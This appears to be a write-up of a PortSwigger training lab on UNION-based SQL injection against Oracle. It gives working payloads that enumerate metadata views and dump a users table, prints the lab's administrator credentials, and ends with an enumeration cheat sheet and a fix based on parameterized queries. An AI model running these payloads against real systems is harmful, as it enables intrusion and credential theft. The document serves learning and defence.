# SQL Injection UNION Attack - Listing Database Contents on Oracle

**Platform:** PortSwigger Web Security Academy  
**Category:** SQL Injection  
**Difficulty:** Practitioner  
**Date:** March 2026

---

## Objective

Enumerate tables and columns in an Oracle database using Oracle-specific metadata views (`all_tables` and `all_tab_columns`), then extract administrator credentials.

---

## Vulnerability

The application is vulnerable to UNION-based SQL injection on an **Oracle database**. Unlike MySQL/PostgreSQL which use `information_schema`, Oracle has its own metadata system using views like `all_tables` and `all_tab_columns`.

**Backend Query Structure:**
```sql
SELECT col1, col2 FROM products WHERE category = 'USER_INPUT'
```

**Developer Mistake:**  
- **No input sanitization** allowing SQL injection
- **Excessive database privileges** — application user can query Oracle metadata views
- **Oracle-specific syntax** not properly secured

**Oracle Requirement:** Every SELECT statement must have a FROM clause. Oracle provides the `dual` dummy table for this purpose.

---

## Understanding Oracle Metadata Views

### Oracle vs MySQL/PostgreSQL Differences:

| Concept | MySQL/PostgreSQL | Oracle |
|---------|------------------|--------|
| **Metadata database** | `information_schema` | Oracle metadata views |
| **List tables** | `information_schema.tables` | `all_tables` |
| **List columns** | `information_schema.columns` | `all_tab_columns` |
| **FROM clause** | Optional for simple SELECTs | **Always required** |
| **Dummy table** | Not needed | `dual` |

### Oracle Metadata Views:

| View | What It Contains |
|------|------------------|
| `all_tables` | All tables accessible to current user |
| `all_tab_columns` | All columns of accessible tables |
| `all_users` | All database users |
| `all_views` | All views |
| `dual` | Single-row dummy table |

---

## My Attack Methodology

### 🔵 Step 1: Find Number of Columns (Oracle Style)

**Payload:**
```sql
' UNION SELECT NULL,NULL FROM dual--
```

**Why this step:**
- Need to match the column count for UNION to work
- **Must use `FROM dual`** — Oracle requires FROM clause
- `dual` is Oracle's built-in one-row table for this purpose

**Result:** ✅ 2 columns confirmed

**Resulting SQL:**
```sql
SELECT col1, col2 FROM products WHERE category = ''
UNION
SELECT NULL, NULL FROM dual--'
```

---

### 🔵 Step 2: Identify Text Columns (Oracle Style)

**Payload:**
```sql
' UNION SELECT 'a','b' FROM dual--
```

**Why this step:**
- Need to confirm both columns accept string data
- **Must use `FROM dual`** — even for this test on Oracle

**Result:** ✅ Both columns accept and display text

**Resulting SQL:**
```sql
SELECT col1, col2 FROM products WHERE category = ''
UNION
SELECT 'a', 'b' FROM dual--'
```

---

### 🔵 Step 3: Enumerate Table Names (Oracle Metadata)

**Payload:**
```sql
' UNION SELECT table_name,NULL FROM all_tables--
```

**Why this step:**
- Oracle doesn't have `information_schema`
- **`all_tables`** is Oracle's metadata view listing all accessible tables
- Looking for the users table

**Result:** Found target table: `USERS_FHLERH` 🎯

**Resulting SQL:**
```sql
SELECT col1, col2 FROM products WHERE category = ''
UNION
SELECT table_name, NULL FROM all_tables--'
```

**What I saw on the page:**
```
PRODUCTS
USERS_FHLERH    ← Target found!
SESSIONS
...
```

**Key Observation:** Oracle table names are typically uppercase by default.

---

### 🔵 Step 4: Enumerate Column Names (Oracle Metadata)

**Payload:**
```sql
' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS_FHLERH'--
```

**Why this step:**
- **`all_tab_columns`** is Oracle's equivalent of `information_schema.columns`
- Filtering by `table_name='USERS_FHLERH'` to get only that table's columns
- Note: `all_tab_columns` not `all_columns` — Oracle naming convention

**Result:** Found columns: `USERNAME_YVWWBG` and `PASSWORD_PRCDTI` 🎯

**Resulting SQL:**
```sql
SELECT col1, col2 FROM products WHERE category = ''
UNION
SELECT column_name, NULL FROM all_tab_columns
WHERE table_name='USERS_FHLERH'--'
```

**What I saw on the page:**
```
USERNAME_YVWWBG
PASSWORD_PRCDTI
```

---

### 🔵 Step 5: Extract the Credentials

**Payload:**
```sql
' UNION SELECT USERNAME_YVWWBG,PASSWORD_PRCDTI FROM USERS_FHLERH--
```

**Why this step:**
- Have everything: table name and column names
- Time to dump the actual credential data
- No `FROM dual` needed here — querying a real table

**Result:** 💥 Credentials dumped!

**Resulting SQL:**
```sql
SELECT col1, col2 FROM products WHERE category = ''
UNION
SELECT USERNAME_YVWWBG, PASSWORD_PRCDTI FROM USERS_FHLERH--'
```

**Extracted Data:**
```
administrator : usjwq8k306ckggznaa3u
```

---

### 🔵 Step 6: Log In as Administrator

**Action:**
- Used extracted credentials to log in
- Username: `administrator`
- Password: `usjwq8k306ckggznaa3u`

**Result:** ✅ Lab solved!

---

## Complete Attack Flow Visualization

```
Step 1: ' UNION SELECT NULL,NULL FROM dual--
        ↓
        ✅ 2 columns exist (Oracle requires FROM dual)

Step 2: ' UNION SELECT 'a','b' FROM dual--
        ↓
        ✅ Both columns are text

Step 3: ' UNION SELECT table_name,NULL FROM all_tables--
        ↓
        ✅ Found table: USERS_FHLERH

Step 4: ' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS_FHLERH'--
        ↓
        ✅ Found columns: USERNAME_YVWWBG, PASSWORD_PRCDTI

Step 5: ' UNION SELECT USERNAME_YVWWBG,PASSWORD_PRCDTI FROM USERS_FHLERH--
        ↓
        💥 Credentials dumped: administrator:usjwq8k306ckggznaa3u

Step 6: Log in with extracted credentials
        ↓
        🎯 Lab solved!
```

---

## Oracle vs MySQL/PostgreSQL Comparison

### Side-by-Side Attack Comparison:

| Step | MySQL/PostgreSQL (Lab 8) | Oracle (Lab 9) |
|------|-------------------------|----------------|
| **Column count** | `' UNION SELECT NULL,NULL--` | `' UNION SELECT NULL,NULL FROM dual--` |
| **Text test** | `' UNION SELECT 'a','b'--` | `' UNION SELECT 'a','b' FROM dual--` |
| **List tables** | `FROM information_schema.tables` | `FROM all_tables` |
| **List columns** | `FROM information_schema.columns` | `FROM all_tab_columns` |
| **Filter by table** | `WHERE table_name='users'` | `WHERE table_name='USERS'` |
| **Case sensitivity** | Lowercase typical | UPPERCASE typical |

**Key Takeaway:** The methodology is identical — only the Oracle-specific syntax differs.

---

## What I Learned

1. **Oracle always requires FROM clause** — use `dual` for dummy queries
2. **Oracle uses `all_tables` not `information_schema`** — different metadata system
3. **`all_tab_columns` lists all columns** — Oracle's version of `information_schema.columns`
---

## Why FROM dual Is Required

### Oracle's Strict Syntax:

```sql
-- ❌ MySQL/PostgreSQL - Works fine
SELECT NULL

-- ❌ Oracle - Syntax error
SELECT NULL

-- ✅ Oracle - Requires FROM clause
SELECT NULL FROM dual
```

**What is `dual`?**
- Built-in Oracle table with **one row, one column**
- Exists purely to satisfy Oracle's FROM requirement
- Always accessible to all users
- Perfect for enumeration tests

```sql
SQL> SELECT * FROM dual;

X
-
X
```

---

## Real-World Impact

This attack demonstrates:
- **Oracle-specific enumeration** — metadata views are accessible
- **Randomized names don't help** — `all_tables` reveals everything
- **Complete credential theft** — usernames and passwords dumped
- **Cross-database techniques** — same methodology, different syntax
- **Database fingerprinting value** — knowing it's Oracle guides the attack

---

## Mitigation

**For Developers:**
- Use **parameterized queries** (prepared statements) — the primary defense
- Apply **principle of least privilege** — revoke access to `all_tables`, `all_tab_columns`
- **Never rely on name obfuscation** — metadata enumeration defeats it
- Implement **input validation** as defense-in-depth
**Example Fix (Python with cx_Oracle):**
```python
# ❌ Vulnerable
query = f"SELECT * FROM products WHERE category = '{user_input}'"

# ✅ Secure
query = "SELECT * FROM products WHERE category = :category"
cursor.execute(query, category=user_input)
```

---

## Oracle Enumeration Cheat Sheet

### Basic Enumeration:

**List all tables:**
```sql
' UNION SELECT table_name,NULL FROM all_tables--
```

**List tables for current user:**
```sql
' UNION SELECT table_name,NULL FROM user_tables--
```

**List all columns for a table:**
```sql
' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS'--
```

**List columns with data types:**
```sql
' UNION SELECT column_name,data_type FROM all_tab_columns WHERE table_name='USERS'--
```

**Get current database user:**
```sql
' UNION SELECT user,NULL FROM dual--
```

**Get database version:**
```sql
' UNION SELECT banner,NULL FROM v$version--
```

**List all database users:**
```sql
' UNION SELECT username,NULL FROM all_users--
```

---

## Oracle-Specific Metadata Views

### Useful Oracle Views:

| View | Description |
|------|-------------|
| `all_tables` | All tables accessible to current user |
| `user_tables` | Tables owned by current user |
| `all_tab_columns` | All columns of accessible tables |
| `user_tab_columns` | Columns of user's tables |
| `all_users` | All database users |
| `all_views` | All views |
| `all_constraints` | All constraints (PKs, FKs, etc.) |
| `v$version` | Database version info |
| `dual` | Dummy one-row table |
